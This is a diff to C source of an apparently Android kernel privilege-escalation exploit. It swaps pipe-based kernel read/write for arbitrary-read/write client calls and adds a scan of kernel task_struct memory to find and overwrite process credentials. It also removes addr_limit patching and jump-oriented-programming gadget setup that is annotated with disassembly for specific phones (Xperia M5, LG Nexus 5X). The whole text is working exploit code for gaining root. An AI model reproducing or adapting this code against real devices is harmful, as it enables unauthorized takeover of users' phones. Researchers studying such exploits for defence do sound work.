@@ -2,13 +2,15 @@
 #include <stdlib.h>
 #include <fcntl.h>
 #include <inttypes.h>
+#include <errno.h>
 
 #include "threadinfo.h"
 #include "sid.h"
 #include "getroot.h"
 
-#define __user
-#define __kernel
+#include <stdint.h>
+#include "client.h"
+#include "debug.h"
 
 #define QUOTE(str) #str
 #define TOSTR(str) QUOTE(str)
@@ -16,79 +18,66 @@
 
 int read_at_address_pipe(void* address, void* buf, ssize_t len)
 {
-	int ret = 1;
-	int pipes[2];
-
-	if(pipe(pipes))
+	if (client_arbitrary_read((uint64_t)address, len, buf) < 0)
 		return 1;
-
-	if(write(pipes[1], address, len) != len)
-		goto end;
-	if(read(pipes[0], buf, len) != len)
-		goto end;
-
-	ret = 0;
-end:
-	close(pipes[1]);
-	close(pipes[0]);
-	return ret;
+	PDBG("KRD 0x%p len=0x%02x\n", address, (unsigned)len);
+	return 0;
 }
 
 int write_at_address_pipe(void* address, void* buf, ssize_t len)
 {
-	int ret = 1;
-	int pipes[2];
-
-	if(pipe(pipes))
+	if (client_arbitrary_write((uint64_t)address, len, buf) < 0)
 		return 1;
-
-	if(write(pipes[1], buf, len) != len)
-		goto end;
-	if(read(pipes[0], address, len) != len)
-		goto end;
-
-	ret = 0;
-end:
-	close(pipes[1]);
-	close(pipes[0]);
-	return ret;
+	PDBG("KWR 0x%p len=0x%02x\n", address, (unsigned)len);
+	return 0;
 }
 
-inline int writel_at_address_pipe(void* address, unsigned long val)
+int get_task_struct_partial_offset(void *__kernel task)
 {
-	return write_at_address_pipe(address, &val, sizeof(val));
+	int i;
+	struct task_struct_partial tsp;
+
+	static int offset = -1;
+
+	if (offset >= 0)
+		return offset;
+
+	for(i = 0x680; i < 0xd60; i+= sizeof(void*))
+	{
+		struct task_struct_partial* __kernel t = (struct task_struct_partial*)(task + i);
+		if(read_at_address_pipe(t, &tsp, sizeof(tsp)))
+			break;
+
+		if (is_cpu_timer_valid(&tsp.cpu_timers[0])
+			&& is_cpu_timer_valid(&tsp.cpu_timers[1])
+			&& is_cpu_timer_valid(&tsp.cpu_timers[2])
+			&& tsp.real_cred == tsp.cred)
+		{
+			break;
+		}
+	}
+	if (i < 0xd60)
+		offset = i;
+	return offset;
 }
 
-int modify_task_cred_uc(struct thread_info* __kernel info)
+int modify_task_cred_uc(void *__kernel task)
 {
-	unsigned int i;
+	int i;
 	unsigned long val;
 	struct cred* __kernel cred = NULL;
-	struct thread_info ti;
 	struct task_security_struct* __kernel security = NULL;
 	struct task_struct_partial* __user tsp;
-
-	if(read_at_address_pipe(info, &ti, sizeof(ti)))
-		return 1;
 
 	tsp = malloc(sizeof(*tsp));
 	if (!tsp)
 		return -ENOMEM;
 
-	for(i = 0; i < 0x600; i+= sizeof(void*))
-	{
-		struct task_struct_partial* __kernel t = (struct task_struct_partial*)((void*)ti.task + i);
-		if(read_at_address_pipe(t, tsp, sizeof(*tsp)))
-			break;
-
-		if (is_cpu_timer_valid(&tsp->cpu_timers[0])
-			&& is_cpu_timer_valid(&tsp->cpu_timers[1])
-			&& is_cpu_timer_valid(&tsp->cpu_timers[2])
-			&& tsp->real_cred == tsp->cred)
-		{
+	i = get_task_struct_partial_offset(task);
+	if (i >= 0) {
+		struct task_struct_partial* __kernel t = (struct task_struct_partial*)(task + i);
+		if(read_at_address_pipe(t, tsp, sizeof(*tsp)) == 0)
 			cred = tsp->cred;
-			break;
-		}
 	}
 
 	free(tsp);
@@ -141,47 +130,3 @@ int modify_task_cred_uc(struct thread_info* __kernel info)
 end:
 	return 0;
 }
-
-#if !(__LP64__)
-
-struct thread_info* patchaddrlimit()
-{
-	struct thread_info* ti = current_thread_info();
-	ti->addr_limit = -1;
-	return ti;
-}
-
-#else
-
-void preparejop(void** addr, void* jopret)
-{
-	unsigned int i;
-	for(i = 0; i < (0x1000 / sizeof(int)); i++)
-		((int*)addr)[i] = 0xDEAD;
-
-/*
-load frame pointer into x0, x0 is mmap address
-LOAD:FFFFFFC0003C66E0                 LDR             X1, [X0,#0x210]
-LOAD:FFFFFFC0003C66E4                 CBZ             X1, loc_FFFFFFC0003C66F0
-LOAD:FFFFFFC0003C66E8                 ADD             X0, X29, #0x78
-LOAD:FFFFFFC0003C66EC                 BLR             X1
-*/
-	addr[66] = jopret; //[X0, #0x210]
-
-/* Xperia M5
-.text:FFFFFFC0001E06FC                 LDR             X1, [X0,#8]
-.text:FFFFFFC0001E0700                 CBZ             X1, loc_FFFFFFC0001E070C
-.text:FFFFFFC0001E0704                 ADD             X0, X29, #0x10
-.text:FFFFFFC0001E0708                 BLR             X1
-*/
-	addr[1] = jopret; //[X0,#8]
-
-/* LG Nexus 5X
-0xffffffc0003ee4f0      011040f9       ldr x1, [x0, 0x20]
-0xffffffc0003ee4f4      a0430191       add x0, x29, 0x50
-0xffffffc0003ee4f8      20003fd6       blr x1
-*/
-	addr[4] = jopret; //[x0, 0x20]
-}
-
-#endif
